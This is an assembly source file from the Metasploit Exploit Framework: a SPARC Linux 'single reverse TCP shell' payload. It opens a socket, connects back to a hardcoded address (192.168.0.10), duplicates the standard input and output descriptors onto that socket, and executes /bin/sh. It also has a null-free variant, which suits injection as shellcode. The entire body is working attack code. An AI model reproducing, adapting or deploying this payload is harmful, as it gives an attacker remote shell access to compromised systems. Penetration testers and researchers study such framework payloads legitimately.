##
#
#        Name: single_reverse_tcp
#   Platforms: Linux
#     Authors: vlad902 <vlad902 [at] gmail.com>
#     Version: $Revision: 1652 $
#     License:
#
#        This file is part of the Metasploit Exploit Framework
#        and is subject to the same licenses and copyrights as
#        the rest of this package.
#
# Description:
#
#        Single reverse TCP shell.
#
##

.globl main

main:
	andn	%sp, 7, %sp

	mov	1, %o0
	mov	2, %l0
	st	%l0, [ %sp - 0x0c ]
	st	%o0, [ %sp - 0x08 ]
	st	%g0, [ %sp - 0x04 ]
	sub	%sp, 0x0c, %o1
	mov	0xce, %g1
	ta	0x10

	sub	%sp, 0x20, %l2
	mov	0x10, %l3
	st	%o0, [ %sp - 0x0c ]
	std	%l3, [ %sp - 0x08 ]

#ifndef NO_NULLS
	set	0x00027a68, %l4
#else
	set	0x27a68fff, %l4
	srl	%l4, 12, %l4
#endif
	set	0xc0a8000a, %l5
	std	%l4, [ %sp - 0x20 ]

	mov	3, %o0
	ta	0x10

	mov	3, %o1
dup2_loop:
	subcc	%o1, 1, %o1
	mov	0x5a, %g1 
	ta	0x10

	bnz	dup2_loop
	ld	[ %sp - 0x0c ], %o0

	xor	%o3, %o3, %o2
	set	0x2f62696e, %l0
	set	0x2f736800, %l1
	sub	%sp, 0x10, %o0
	sub	%sp, 0x08, %o1
	std	%l0, [ %sp - 0x10 ]
	st	%o0, [ %sp - 0x08 ]
	st	%g0, [ %sp - 0x04 ]
	mov	0x3b, %g1
	ta	0x08
